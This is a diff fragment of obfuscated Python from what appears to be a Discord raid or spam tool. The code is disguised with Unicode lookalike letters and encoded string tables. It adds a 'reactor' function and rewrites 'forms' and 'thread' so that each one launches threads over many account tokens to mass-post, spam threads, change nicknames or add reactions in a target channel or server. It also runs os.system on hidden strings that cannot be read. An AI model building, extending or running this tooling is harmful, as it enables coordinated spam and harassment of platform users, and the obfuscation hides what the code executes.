-    @𝙬𝗿𝙖𝙥𝘱𝙚𝗿
+    @𝘄𝗿𝘢𝙥𝗽𝙚𝙧
+    def reactor(self):
+        𝗼𝘴.system(𝗜𝘕𝘐𝘕𝙡𝘭𝗜𝗠𝗜𝘐𝘭𝘔𝘭𝙡𝗜𝙡𝘭𝙉𝙉𝘐𝗹𝘭𝘔𝘕𝙡𝘕𝗹𝙈𝗜𝙈𝙄𝗠[90])
+        𝘮𝘦𝘀𝘴𝗮𝙜𝘦_𝘭𝗶𝙣𝘬 = 𝘪𝗻𝗽𝙪𝘵(f'{𝙧}{𝘐𝗡𝘐𝘕𝙡𝗹𝙄𝗠𝘐𝗜𝙡𝘔𝙡𝙡𝙄𝗹𝗹𝗡𝘕𝗜𝙡𝙡𝙈𝙉𝘭𝗡𝗹𝘔𝙄𝗠𝙄𝘔[91]}{𝘭𝘤}{𝙄𝗡𝘐𝘕𝙡𝘭𝘐𝙈𝘐𝗜𝙡𝗠𝙡𝙡𝙄𝙡𝗹𝘕𝘕𝙄𝙡𝘭𝘔𝙉𝗹𝘕𝙡𝗠𝗜𝙈𝘐𝗠[364]}{𝙧}{𝘐𝙉𝙄𝘕𝙡𝗹𝗜𝘔𝘐𝙄𝗹𝗠𝙡𝗹𝙄𝗹𝙡𝙉𝘕𝙄𝙡𝙡𝙈𝗡𝙡𝙉𝘭𝘔𝘐𝘔𝙄𝙈[365]}')
+        if 𝙢𝗲𝘴𝘴𝙖𝘨𝘦_𝙡𝙞𝙣𝙠 == 𝙄𝙉𝙄𝘕𝘭𝘭𝙄𝘔𝗜𝙄𝘭𝗠𝙡𝗹𝘐𝘭𝙡𝙉𝗡𝙄𝘭𝗹𝘔𝙉𝘭𝙉𝘭𝙈𝘐𝗠𝘐𝗠[22]:
+            𝗠𝘦𝙣𝙪().main_menu()
+        𝗽𝘳𝘪𝘯𝙩(f'{𝘳}{𝗜𝗡𝗜𝙉𝙡𝗹𝗜𝗠𝘐𝗜𝙡𝘔𝙡𝗹𝘐𝙡𝗹𝙉𝗡𝙄𝘭𝙡𝗠𝘕𝗹𝘕𝗹𝙈𝗜𝙈𝗜𝙈[369]}{𝘭𝘤}{𝗜𝘕𝘐𝘕𝙡𝗹𝘐𝙈𝙄𝘐𝗹𝙈𝙡𝙡𝘐𝙡𝗹𝙉𝗡𝘐𝗹𝗹𝘔𝗡𝙡𝘕𝗹𝗠𝙄𝗠𝘐𝘔[231]}{𝗿}{𝘐𝗡𝗜𝙉𝗹𝘭𝘐𝘔𝘐𝙄𝘭𝘔𝘭𝗹𝗜𝙡𝗹𝗡𝗡𝙄𝙡𝘭𝙈𝘕𝘭𝗡𝙡𝗠𝙄𝘔𝗜𝘔[370]}')
+        𝗿𝘦𝘢𝗰𝙩𝗶𝙤𝗻 = 𝗶𝘯𝗽𝙪𝙩(f'{𝙧}{𝗜𝗡𝙄𝙉𝘭𝘭𝙄𝗠𝘐𝗜𝙡𝗠𝙡𝘭𝙄𝙡𝙡𝗡𝘕𝗜𝘭𝗹𝗠𝘕𝗹𝙉𝘭𝙈𝗜𝙈𝙄𝗠[91]}{𝘭𝗰}{𝙄𝙉𝙄𝙉𝘭𝘭𝗜𝗠𝙄𝙄𝘭𝗠𝘭𝙡𝙄𝗹𝗹𝘕𝘕𝘐𝘭𝗹𝗠𝗡𝙡𝗡𝘭𝘔𝙄𝙈𝙄𝘔[371]}{𝘳}{𝘐𝙉𝘐𝗡𝗹𝙡𝗜𝗠𝘐𝙄𝗹𝙈𝘭𝗹𝘐𝙡𝗹𝘕𝘕𝘐𝘭𝗹𝗠𝘕𝙡𝙉𝗹𝙈𝘐𝗠𝘐𝗠[365]}')
+        if 𝗿𝘦𝘢𝗰𝘵𝙞𝘰𝙣 == 𝗜𝙉𝙄𝙉𝘭𝙡𝗜𝗠𝗜𝘐𝘭𝘔𝙡𝘭𝘐𝘭𝗹𝙉𝙉𝗜𝗹𝗹𝘔𝙉𝗹𝘕𝘭𝙈𝘐𝗠𝘐𝙈[22]:
+            𝙈𝗲𝗻𝙪().main_menu()
+        𝘰𝙨.system(𝘐𝙉𝙄𝙉𝘭𝙡𝘐𝗠𝙄𝗜𝗹𝘔𝗹𝘭𝙄𝘭𝘭𝗡𝗡𝙄𝘭𝙡𝘔𝗡𝙡𝘕𝗹𝗠𝗜𝙈𝙄𝙈[1])
+        𝙥𝙧𝙞𝘯𝙩(𝗺𝙚𝙣𝘶)
+        for 𝙩𝗼𝙠𝙚𝗻 in 𝙩𝙤𝗸𝙚𝙣𝘴:
+            𝘵𝙝𝗿𝗲𝙖𝙙𝙞𝙣𝘨.Thread(target=𝙧𝗲𝘢𝗰𝘁𝗼𝗿, args=(𝙩𝙤𝙠𝙚𝙣, 𝙧𝘦𝘢𝗰𝘵𝘪𝙤𝙣, 𝙢𝘦𝙨𝘀𝗮𝙜𝙚_𝘭𝙞𝘯𝗸)).start()
+        𝗲𝘅𝗶𝘵 = 𝙞𝘯𝙥𝘂𝙩(𝙄𝙉𝙄𝘕𝗹𝙡𝗜𝗠𝘐𝙄𝙡𝗠𝗹𝙡𝙄𝙡𝗹𝘕𝘕𝗜𝙡𝙡𝘔𝙉𝘭𝗡𝙡𝘔𝗜𝙈𝘐𝙈[22])
+        𝗲𝘹𝙞𝘁 = 𝗠𝗲𝘯𝙪().main_menu()
+        𝗲𝙭𝗶𝘁()
+
+    @𝘸𝘳𝙖𝙥𝗽𝘦𝙧
     def forms(self):
-        𝘰𝘀.system(𝗡𝘔𝘔𝙈𝙉𝘭𝗹𝘔𝙈𝘭𝗠𝙈𝗡𝗹𝘐𝗠𝘐𝙄𝘕𝘔𝘐𝙄𝙈𝙄𝘭𝘐𝙉𝗜𝗠𝗜𝘐𝘔[1])
-        𝘱𝙧𝙞𝘯𝙩(𝙢𝘦𝘯𝙪)
-        𝘰𝙨.system(𝗡𝙈𝙈𝗠𝗡𝙡𝘭𝘔𝗠𝙡𝗠𝗠𝘕𝗹𝘐𝗠𝗜𝙄𝗡𝙈𝗜𝗜𝘔𝗜𝙡𝗜𝗡𝘐𝘔𝗜𝘐𝘔[379])
-        𝙘𝗵𝗮𝘯𝗻𝗲𝗹 = 𝗰𝗕𝙎𝗞𝘽𝙜𝙁2𝘯0𝗮𝙠𝙌𝙭𝙓_02𝙖0𝘺𝗾𝗹𝙣𝗨𝘒𝗙_𝘫𝙉𝘜𝙇.mro()[5](𝘪𝙣𝘱𝘶𝘁(f'{𝗿}{𝙉𝗠𝗠𝗠𝙉𝙡𝙡𝘔𝘔𝗹𝙈𝗠𝘕𝙡𝗜𝗠𝘐𝗜𝗡𝗠𝘐𝗜𝙈𝘐𝗹𝙄𝗡𝘐𝗠𝗜𝘐𝙈[98]}{𝙡𝘤}{𝙉𝘔𝘔𝘔𝙉𝙡𝙡𝘔𝘔𝘭𝘔𝙈𝗡𝗹𝙄𝘔𝘐𝗜𝗡𝗠𝙄𝗜𝗠𝗜𝙡𝗜𝗡𝘐𝙈𝗜𝘐𝘔[380]}{𝙧}{𝗡𝘔𝘔𝙈𝙉𝗹𝙡𝘔𝘔𝗹𝙈𝘔𝗡𝘭𝙄𝙈𝗜𝗜𝗡𝗠𝘐𝗜𝘔𝘐𝗹𝙄𝙉𝙄𝗠𝙄𝗜𝙈[372]}'))
-        if 𝙘𝙝𝗮𝗻𝗻𝗲𝗹 == 𝘕𝗠𝘔𝗠𝘕𝗹𝗹𝗠𝗠𝗹𝘔𝗠𝗡𝘭𝘐𝗠𝗜𝙄𝗡𝙈𝘐𝘐𝘔𝙄𝘭𝗜𝙉𝙄𝘔𝘐𝗜𝗠[29]:
-            𝙈𝙚𝙣𝘶().main_menu()
-        𝙣𝘢𝙢𝘦 = 𝘪𝙣𝙥𝙪𝘵(f'{𝘳}{𝙉𝙈𝙈𝙈𝘕𝙡𝗹𝗠𝘔𝗹𝙈𝙈𝙉𝗹𝘐𝗠𝘐𝘐𝘕𝘔𝙄𝗜𝙈𝗜𝙡𝗜𝙉𝗜𝙈𝙄𝘐𝘔[98]}{𝙡𝘤}{𝘕𝗠𝙈𝙈𝙉𝗹𝘭𝗠𝙈𝗹𝙈𝙈𝙉𝗹𝘐𝗠𝗜𝙄𝗡𝙈𝘐𝘐𝗠𝘐𝗹𝘐𝙉𝙄𝘔𝙄𝘐𝘔[381]}{𝙧}{𝗡𝗠𝗠𝗠𝗡𝗹𝙡𝙈𝙈𝙡𝗠𝘔𝙉𝙡𝘐𝙈𝗜𝗜𝘕𝘔𝘐𝙄𝗠𝗜𝙡𝙄𝙉𝗜𝙈𝗜𝙄𝙈[372]}')
-        if 𝙣𝙖𝗺𝗲 == 𝘕𝙈𝗠𝙈𝘕𝗹𝗹𝘔𝘔𝙡𝘔𝗠𝗡𝗹𝘐𝗠𝙄𝙄𝙉𝘔𝙄𝙄𝙈𝘐𝙡𝘐𝗡𝙄𝙈𝘐𝘐𝗠[29]:
-            𝘔𝙚𝙣𝘶().main_menu()
-        𝘮𝘀𝘨 = 𝗶𝙣𝘱𝘂𝘁(f'{𝙧}{𝙉𝗠𝙈𝙈𝘕𝘭𝘭𝗠𝗠𝘭𝘔𝗠𝙉𝙡𝘐𝙈𝙄𝙄𝗡𝘔𝘐𝘐𝗠𝙄𝙡𝘐𝘕𝙄𝗠𝘐𝙄𝗠[98]}{𝘭𝗰}{𝘕𝙈𝘔𝗠𝙉𝘭𝙡𝙈𝘔𝘭𝙈𝘔𝙉𝘭𝗜𝗠𝙄𝗜𝙉𝗠𝙄𝙄𝗠𝙄𝙡𝗜𝗡𝗜𝙈𝘐𝙄𝘔[382]}{𝘳}{𝙉𝘔𝗠𝗠𝙉𝘭𝗹𝗠𝘔𝙡𝙈𝘔𝗡𝙡𝗜𝙈𝘐𝘐𝘕𝗠𝘐𝗜𝙈𝗜𝗹𝗜𝗡𝙄𝙈𝘐𝙄𝙈[372]}')
-        if 𝗺𝘴𝘨 == 𝙉𝘔𝗠𝘔𝘕𝙡𝙡𝙈𝙈𝘭𝘔𝗠𝗡𝘭𝘐𝘔𝙄𝙄𝗡𝙈𝙄𝗜𝘔𝗜𝙡𝘐𝘕𝗜𝘔𝘐𝙄𝘔[29]:
-            𝗠𝘦𝙣𝘂().main_menu()
-        𝘰𝘴.system(𝙉𝙈𝘔𝗠𝘕𝗹𝗹𝗠𝘔𝗹𝘔𝙈𝙉𝗹𝙄𝘔𝙄𝗜𝘕𝘔𝙄𝗜𝘔𝘐𝘭𝗜𝘕𝗜𝗠𝙄𝙄𝘔[1])
-        𝗽𝘳𝗶𝘯𝙩(𝙢𝘦𝙣𝘂)
-        for 𝘵𝗼𝗸𝘦𝘯 in 𝘵𝙤𝘬𝙚𝗻𝘀:
-            𝘁𝙝𝗿𝗲𝘢𝙙𝙞𝗻𝗴.Thread(target=𝗽𝗼𝘀𝘁_𝙨𝗽𝗮𝘮𝗺𝗲𝙧, args=(𝙩𝗼𝗸𝙚𝗻, 𝘤𝘩𝘢𝘯𝙣𝙚𝗹, 𝙣𝘢𝙢𝘦, 𝗺𝘀𝗴)).start()
-        𝘦𝘹𝗶𝘵 = 𝙞𝘯𝗽𝘶𝘵(𝗡𝘔𝙈𝘔𝘕𝙡𝗹𝙈𝗠𝗹𝙈𝗠𝘕𝘭𝘐𝘔𝗜𝙄𝙉𝘔𝙄𝙄𝙈𝗜𝘭𝘐𝗡𝙄𝘔𝘐𝗜𝗠[29])
-        𝗲𝙭𝗶𝘁 = 𝙈𝗲𝗻𝙪().main_menu()
+        𝘰𝘴.system(𝙄𝗡𝙄𝙉𝙡𝘭𝙄𝙈𝗜𝙄𝗹𝘔𝗹𝙡𝙄𝘭𝗹𝘕𝙉𝙄𝗹𝙡𝗠𝙉𝗹𝙉𝘭𝙈𝙄𝙈𝙄𝗠[1])
+        𝘱𝙧𝗶𝗻𝘵(𝗺𝘦𝙣𝘶)
+        𝗼𝙨.system(𝘐𝙉𝗜𝘕𝗹𝘭𝗜𝘔𝘐𝗜𝘭𝘔𝙡𝘭𝗜𝗹𝗹𝗡𝗡𝘐𝗹𝘭𝗠𝗡𝗹𝗡𝘭𝘔𝘐𝗠𝗜𝘔[372])
+        𝘤𝗵𝗮𝘯𝘯𝗲𝘭 = 𝙮𝗯𝘜𝗳𝗢𝗰𝙇39𝗗𝙪𝗢𝗻𝗳_𝘶𝘘𝙩𝙀𝘢𝙗𝗧𝘮𝗩𝗰𝘛𝘺𝗠𝙠08𝙬.mro()[8](𝘪𝘯𝙥𝙪𝙩(f'{𝗿}{𝙄𝘕𝘐𝗡𝙡𝗹𝘐𝙈𝙄𝙄𝗹𝘔𝗹𝘭𝗜𝙡𝙡𝘕𝙉𝘐𝗹𝗹𝙈𝘕𝙡𝙉𝗹𝙈𝗜𝘔𝙄𝗠[91]}{𝘭𝗰}{𝙄𝘕𝗜𝗡𝙡𝘭𝘐𝘔𝘐𝗜𝘭𝗠𝘭𝗹𝗜𝘭𝗹𝗡𝙉𝗜𝙡𝗹𝘔𝗡𝙡𝗡𝘭𝗠𝘐𝘔𝙄𝙈[373]}{𝙧}{𝗜𝗡𝙄𝗡𝗹𝗹𝗜𝘔𝘐𝗜𝙡𝗠𝘭𝙡𝙄𝙡𝙡𝗡𝙉𝘐𝘭𝙡𝘔𝙉𝙡𝘕𝘭𝘔𝘐𝗠𝘐𝗠[365]}'))
+        if 𝘤𝗵𝗮𝙣𝗻𝙚𝗹 == 𝗜𝘕𝘐𝗡𝘭𝗹𝘐𝙈𝙄𝗜𝘭𝗠𝙡𝗹𝗜𝙡𝘭𝙉𝗡𝘐𝘭𝘭𝗠𝘕𝘭𝙉𝘭𝘔𝗜𝙈𝗜𝘔[22]:
+            𝙈𝘦𝘯𝙪().main_menu()
+        𝗻𝗮𝙢𝘦 = 𝗶𝘯𝘱𝘂𝘁(f'{𝙧}{𝗜𝘕𝘐𝗡𝗹𝗹𝙄𝘔𝙄𝗜𝗹𝙈𝙡𝙡𝗜𝗹𝙡𝙉𝗡𝙄𝗹𝗹𝘔𝙉𝗹𝗡𝙡𝗠𝘐𝙈𝙄𝗠[91]}{𝗹𝗰}{𝙄𝙉𝗜𝗡𝗹𝗹𝙄𝘔𝘐𝗜𝘭𝙈𝙡𝙡𝙄𝙡𝗹𝘕𝗡𝙄𝗹𝘭𝘔𝗡𝙡𝗡𝙡𝗠𝘐𝗠𝘐𝙈[374]}{𝗿}{𝙄𝙉𝘐𝙉𝘭𝙡𝗜𝗠𝘐𝘐𝙡𝘔𝘭𝘭𝙄𝗹𝘭𝗡𝙉𝗜𝙡𝗹𝙈𝗡𝘭𝘕𝘭𝗠𝗜𝗠𝗜𝙈[365]}')
+        if 𝘯𝘢𝗺𝗲 == 𝘐𝗡𝗜𝙉𝙡𝗹𝙄𝙈𝗜𝗜𝙡𝙈𝘭𝙡𝗜𝙡𝗹𝗡𝙉𝗜𝘭𝘭𝙈𝗡𝘭𝙉𝘭𝘔𝗜𝘔𝗜𝗠[22]:
+            𝘔𝘦𝗻𝘂().main_menu()
+        𝘮𝙨𝘨 = 𝘪𝙣𝙥𝘂𝘵(f'{𝙧}{𝗜𝘕𝗜𝗡𝗹𝙡𝗜𝘔𝗜𝙄𝘭𝙈𝙡𝗹𝙄𝘭𝙡𝗡𝗡𝗜𝗹𝘭𝗠𝙉𝘭𝘕𝙡𝘔𝗜𝗠𝗜𝘔[91]}{𝗹𝙘}{𝗜𝗡𝗜𝙉𝘭𝗹𝙄𝗠𝗜𝙄𝙡𝘔𝙡𝗹𝘐𝙡𝘭𝘕𝗡𝘐𝘭𝘭𝙈𝗡𝘭𝘕𝗹𝙈𝗜𝗠𝘐𝙈[375]}{𝙧}{𝘐𝘕𝙄𝗡𝗹𝘭𝗜𝙈𝗜𝘐𝗹𝙈𝙡𝙡𝗜𝙡𝗹𝗡𝙉𝗜𝗹𝗹𝙈𝙉𝗹𝙉𝙡𝙈𝘐𝙈𝗜𝘔[365]}')
+        if 𝘮𝘴𝘨 == 𝘐𝘕𝘐𝙉𝗹𝘭𝘐𝘔𝙄𝘐𝘭𝙈𝘭𝗹𝘐𝘭𝗹𝙉𝗡𝘐𝙡𝘭𝘔𝗡𝙡𝘕𝙡𝙈𝙄𝗠𝙄𝗠[22]:
+            𝘔𝗲𝙣𝙪().main_menu()
+        𝘰𝘴.system(𝗜𝙉𝘐𝗡𝗹𝘭𝗜𝘔𝙄𝗜𝘭𝙈𝗹𝘭𝘐𝘭𝙡𝗡𝗡𝘐𝙡𝘭𝘔𝗡𝘭𝙉𝙡𝙈𝗜𝘔𝘐𝗠[1])
+        𝘱𝙧𝗶𝙣𝘁(𝙢𝘦𝘯𝘂)
+        for 𝙩𝘰𝙠𝘦𝙣 in 𝙩𝘰𝙠𝗲𝗻𝘀:
+            𝙩𝘩𝙧𝗲𝗮𝙙𝙞𝘯𝗴.Thread(target=𝗽𝙤𝘴𝘁_𝘴𝗽𝘢𝘮𝙢𝘦𝗿, args=(𝙩𝙤𝘬𝙚𝘯, 𝗰𝙝𝘢𝘯𝘯𝙚𝗹, 𝗻𝙖𝙢𝙚, 𝗺𝙨𝗴)).start()
+        𝙚𝙭𝗶𝙩 = 𝘪𝗻𝗽𝘂𝘁(𝘐𝙉𝙄𝘕𝙡𝗹𝙄𝗠𝘐𝘐𝗹𝙈𝙡𝙡𝘐𝗹𝙡𝗡𝘕𝗜𝘭𝗹𝗠𝙉𝘭𝙉𝙡𝙈𝘐𝘔𝙄𝗠[22])
+        𝙚𝘅𝙞𝘁 = 𝙈𝙚𝗻𝘂().main_menu()
         𝙚𝘅𝗶𝘁()
 
-    @𝙬𝙧𝗮𝘱𝗽𝗲𝘳
+    @𝘸𝘳𝘢𝗽𝗽𝙚𝗿
     def thread(self):
-        𝘰𝙨.system(𝙉𝘔𝙈𝘔𝗡𝗹𝗹𝗠𝗠𝗹𝙈𝘔𝗡𝙡𝗜𝘔𝗜𝙄𝗡𝘔𝘐𝙄𝘔𝘐𝘭𝗜𝗡𝘐𝗠𝙄𝗜𝙈[1])
-        𝙥𝗿𝗶𝘯𝘁(𝗺𝘦𝙣𝘂)
-        𝙤𝘴.system(𝙉𝗠𝙈𝙈𝙉𝙡𝗹𝗠𝗠𝗹𝘔𝘔𝙉𝗹𝗜𝘔𝗜𝘐𝗡𝗠𝙄𝘐𝗠𝗜𝗹𝗜𝗡𝗜𝘔𝗜𝗜𝙈[383])
-        𝘯𝙖𝘮𝙚 = 𝗶𝗻𝗽𝙪𝙩(f'{𝘳}{𝗡𝗠𝘔𝙈𝙉𝗹𝘭𝘔𝘔𝙡𝗠𝘔𝗡𝘭𝘐𝙈𝗜𝗜𝘕𝘔𝘐𝘐𝙈𝗜𝙡𝗜𝗡𝘐𝘔𝗜𝘐𝙈[98]}{𝗹𝘤}{𝙉𝗠𝗠𝘔𝙉𝘭𝘭𝗠𝙈𝘭𝙈𝗠𝙉𝙡𝗜𝘔𝘐𝙄𝘕𝘔𝘐𝙄𝙈𝗜𝘭𝙄𝘕𝗜𝙈𝙄𝙄𝗠[384]}{𝘳}{𝘕𝗠𝗠𝘔𝙉𝙡𝗹𝘔𝘔𝗹𝗠𝗠𝘕𝘭𝘐𝗠𝗜𝙄𝙉𝙈𝗜𝗜𝘔𝗜𝘭𝗜𝘕𝗜𝗠𝗜𝗜𝗠[372]}')
-        if 𝗻𝗮𝙢𝘦 == 𝙉𝙈𝙈𝗠𝗡𝘭𝗹𝙈𝘔𝘭𝗠𝘔𝘕𝙡𝘐𝘔𝗜𝙄𝘕𝙈𝗜𝙄𝙈𝙄𝙡𝘐𝗡𝗜𝙈𝗜𝗜𝗠[29]:
-            𝙈𝗲𝙣𝘶().main_menu()
-        𝙘𝘩𝗮𝙣𝗻𝘦𝗹 = 𝙫𝘫𝘐𝘗𝘜𝘯𝘜_𝙖𝘲𝙝𝙕𝙢𝙛𝗱𝗚𝗶𝘌𝙥5𝗿𝗨1𝙜5𝘂𝘳8𝘾𝘛𝗔8.mro()[5](𝙞𝙣𝘱𝘂𝙩(f'{𝘳}{𝘕𝘔𝘔𝙈𝘕𝙡𝗹𝗠𝙈𝗹𝙈𝘔𝘕𝗹𝘐𝗠𝘐𝘐𝗡𝙈𝙄𝗜𝙈𝗜𝗹𝗜𝘕𝗜𝙈𝘐𝗜𝗠[98]}{𝗹𝗰}{𝘕𝗠𝗠𝗠𝙉𝘭𝘭𝙈𝘔𝘭𝗠𝙈𝘕𝘭𝘐𝘔𝗜𝗜𝗡𝙈𝗜𝘐𝗠𝘐𝙡𝗜𝗡𝘐𝘔𝗜𝗜𝗠[380]}{𝘳}{𝘕𝙈𝙈𝗠𝘕𝘭𝗹𝘔𝙈𝗹𝙈𝘔𝙉𝘭𝗜𝗠𝗜𝘐𝙉𝗠𝙄𝗜𝗠𝙄𝗹𝙄𝘕𝗜𝗠𝙄𝙄𝘔[372]}'))
-        if 𝗰𝙝𝙖𝘯𝙣𝙚𝗹 == 𝘕𝘔𝙈𝘔𝙉𝙡𝙡𝙈𝘔𝗹𝙈𝘔𝘕𝗹𝗜𝗠𝘐𝙄𝙉𝘔𝗜𝗜𝙈𝗜𝗹𝙄𝗡𝗜𝘔𝙄𝗜𝙈[29]:
-            𝗠𝗲𝘯𝘂().main_menu()
-        𝙤𝘴.system(𝘕𝙈𝘔𝙈𝗡𝗹𝗹𝗠𝘔𝘭𝘔𝗠𝙉𝙡𝙄𝗠𝘐𝗜𝘕𝗠𝘐𝙄𝗠𝗜𝘭𝙄𝗡𝗜𝙈𝗜𝗜𝗠[1])
-        𝗽𝗿𝙞𝙣𝙩(𝙢𝙚𝙣𝘶)
-        for 𝙩𝗼𝙠𝗲𝙣 in 𝘵𝙤𝘬𝘦𝙣𝙨:
-            𝘁𝘩𝘳𝗲𝘢𝗱𝗶𝗻𝙜.Thread(target=𝘵𝘩𝙧𝗲𝘢𝙙_𝘀𝙥𝘢𝘮𝙢𝗲𝘳, args=(𝘁𝗼𝘬𝙚𝙣, 𝘯𝘢𝗺𝗲, 𝙘𝙝𝙖𝘯𝙣𝗲𝘭)).start()
-        𝙚𝘹𝘪𝙩 = 𝘪𝘯𝗽𝘶𝘁(𝗡𝘔𝘔𝙈𝗡𝘭𝗹𝘔𝗠𝙡𝙈𝗠𝗡𝘭𝙄𝘔𝗜𝙄𝗡𝙈𝘐𝙄𝘔𝙄𝘭𝗜𝘕𝘐𝗠𝗜𝘐𝙈[29])
-        𝗲𝙭𝘪𝘁 = 𝗠𝙚𝗻𝙪().main_menu()
-        𝙚𝘹𝘪𝘵()
-
-    @𝘄𝘳𝙖𝙥𝙥𝗲𝘳
-    def Nick(self):
-        𝗼𝘴.system(𝙉𝙈𝗠𝗠𝘕𝘭𝘭𝙈𝙈𝘭𝘔𝘔𝘕𝗹𝘐𝘔𝙄𝗜𝘕𝗠𝗜𝘐𝙈𝘐𝙡𝗜𝘕𝘐𝘔𝗜𝗜𝗠[385])
-        𝗼𝘀.system(𝘕𝗠𝙈𝙈𝘕𝗹𝘭𝘔𝘔𝙡𝗠𝙈𝘕𝗹𝙄𝘔𝗜𝗜𝘕𝙈𝙄𝙄𝘔𝙄𝙡𝗜𝙉𝗜𝙈𝘐𝘐𝙈[1])
-        𝘱𝗿𝗶𝙣𝘁(𝙢𝙚𝘯𝙪)
-        𝘨𝙪𝗶𝗹𝙙 = 𝙉𝙔𝘬7𝘳𝙮𝙧𝘺𝗷𝘎𝘟𝘰𝗢𝙩𝘤𝙒𝗯𝘂𝘦𝘂𝘌𝙪2𝘁𝗿𝙙𝙂𝘔𝙠𝙙𝘫𝘾.mro()[10](𝙞𝙣𝘱𝙪𝘵(f'{𝗿}{𝘕𝘔𝙈𝗠𝗡𝙡𝙡𝙈𝙈𝗹𝘔𝗠𝙉𝙡𝘐𝙈𝙄𝘐𝙉𝗠𝘐𝘐𝙈𝙄𝘭𝘐𝘕𝘐𝙈𝙄𝙄𝙈[98]}{𝗹𝗰}{𝘕𝙈𝗠𝘔𝙉𝘭𝗹𝘔𝙈𝙡𝘔𝘔𝙉𝗹𝘐𝘔𝙄𝘐𝗡𝘔𝗜𝙄𝗠𝙄𝙡𝗜𝗡𝗜𝗠𝙄𝘐𝙈[386]}{𝗿}{𝗡𝗠𝙈𝙈𝙉𝗹𝙡𝘔𝘔𝗹𝘔𝗠𝘕𝗹𝙄𝘔𝙄𝘐𝗡𝗠𝘐𝘐𝘔𝙄𝙡𝙄𝙉𝙄𝘔𝘐𝗜𝘔[372]}'))
-        if 𝘨𝘶𝘪𝙡𝙙 == 𝗡𝘔𝘔𝙈𝙉𝙡𝘭𝘔𝙈𝘭𝗠𝗠𝗡𝘭𝘐𝙈𝘐𝙄𝗡𝘔𝙄𝙄𝘔𝘐𝗹𝘐𝙉𝘐𝗠𝙄𝙄𝙈[29]:
-            𝘔𝙚𝙣𝘶().main_menu()
-        𝘯𝗶𝙘𝙠 = 𝘪𝙣𝘱𝘶𝘵(f'{𝗿}{𝘕𝙈𝙈𝘔𝙉𝗹𝘭𝗠𝙈𝗹𝙈𝗠𝘕𝗹𝙄𝗠𝘐𝙄𝗡𝗠𝙄𝙄𝗠𝗜𝗹𝙄𝗡𝙄𝙈𝘐𝘐𝙈[98]}{𝗹𝘤}{𝗡𝘔𝗠𝗠𝙉𝙡𝙡𝙈𝙈𝙡𝗠𝙈𝘕𝘭𝙄𝘔𝘐𝙄𝗡𝗠𝘐𝘐𝘔𝘐𝙡𝙄𝙉𝗜𝙈𝘐𝗜𝙈[387]}{𝘳}{𝘕𝙈𝙈𝙈𝗡𝘭𝘭𝗠𝘔𝙡𝘔𝘔𝘕𝙡𝘐𝘔𝘐𝘐𝗡𝘔𝘐𝙄𝙈𝙄𝗹𝗜𝙉𝘐𝘔𝙄𝗜𝙈[372]}')
-        if 𝘯𝘪𝗰𝙠 == 𝙉𝗠𝗠𝗠𝘕𝙡𝗹𝙈𝘔𝘭𝘔𝗠𝗡𝗹𝘐𝙈𝙄𝘐𝘕𝙈𝗜𝗜𝘔𝗜𝗹𝙄𝙉𝗜𝘔𝙄𝙄𝙈[29]:
+        𝘰𝘀.system(𝘐𝙉𝘐𝗡𝘭𝙡𝗜𝗠𝙄𝗜𝗹𝘔𝗹𝘭𝙄𝗹𝗹𝙉𝗡𝘐𝗹𝘭𝙈𝘕𝙡𝗡𝗹𝙈𝙄𝙈𝙄𝗠[1])
+        𝗽𝙧𝘪𝘯𝘵(𝘮𝗲𝘯𝙪)
+        𝗼𝘀.system(𝙄𝗡𝘐𝙉𝘭𝘭𝙄𝘔𝗜𝗜𝗹𝙈𝙡𝙡𝙄𝘭𝗹𝘕𝘕𝗜𝘭𝘭𝙈𝘕𝘭𝗡𝗹𝘔𝙄𝙈𝙄𝘔[376])
+        𝗻𝗮𝗺𝗲 = 𝗶𝗻𝘱𝘂𝘵(f'{𝗿}{𝘐𝗡𝗜𝘕𝙡𝗹𝙄𝙈𝙄𝘐𝗹𝗠𝗹𝘭𝘐𝘭𝙡𝙉𝘕𝗜𝗹𝙡𝘔𝘕𝗹𝗡𝙡𝗠𝘐𝙈𝘐𝗠[91]}{𝘭𝙘}{𝘐𝙉𝘐𝘕𝘭𝘭𝙄𝙈𝙄𝙄𝘭𝗠𝙡𝘭𝘐𝗹𝘭𝙉𝘕𝗜𝙡𝘭𝘔𝘕𝙡𝗡𝙡𝘔𝙄𝘔𝗜𝘔[377]}{𝗿}{𝙄𝗡𝘐𝗡𝙡𝗹𝗜𝙈𝗜𝗜𝗹𝗠𝙡𝙡𝘐𝘭𝙡𝗡𝗡𝗜𝘭𝘭𝙈𝙉𝙡𝗡𝘭𝗠𝙄𝗠𝘐𝙈[365]}')
+        if 𝘯𝙖𝗺𝗲 == 𝘐𝙉𝗜𝘕𝘭𝘭𝗜𝙈𝙄𝗜𝘭𝘔𝘭𝙡𝗜𝙡𝙡𝗡𝗡𝙄𝗹𝘭𝙈𝙉𝙡𝙉𝙡𝙈𝙄𝘔𝘐𝗠[22]:
             𝙈𝘦𝗻𝙪().main_menu()
-        𝘰𝘀.system(𝗡𝘔𝙈𝙈𝘕𝘭𝙡𝙈𝙈𝘭𝘔𝘔𝙉𝘭𝙄𝙈𝗜𝙄𝙉𝘔𝘐𝗜𝗠𝘐𝙡𝗜𝗡𝙄𝗠𝙄𝙄𝘔[1])
-        𝘱𝙧𝙞𝘯𝘁(𝙢𝘦𝗻𝙪)
-        for 𝙩𝗼𝙠𝘦𝗻 in 𝘵𝙤𝘬𝗲𝗻𝙨:
-            𝘁𝗵𝙧𝘦𝗮𝘥𝘪𝘯𝗴.Thread(target=𝘮𝘢𝘴𝙨_𝙣𝘪𝙘𝘬, args=(𝘁𝙤𝙠𝗲𝘯, 𝘨𝘂𝙞𝘭𝗱, 𝘯𝙞𝙘𝗸)).start()
-        𝗲𝙭𝙞𝘵 = 𝘪𝙣𝙥𝘂𝘵(𝙉𝗠𝗠𝘔𝘕𝘭𝘭𝘔𝙈𝘭𝗠𝙈𝘕𝙡𝗜𝘔𝘐𝘐𝘕𝙈𝗜𝘐𝙈𝗜𝙡𝗜𝙉𝗜𝗠𝘐𝗜𝗠[29])
-        𝙚𝙭𝗶𝘁 = 𝗠𝗲𝘯𝙪().main_menu()
-        𝙚𝘅𝙞𝘵()
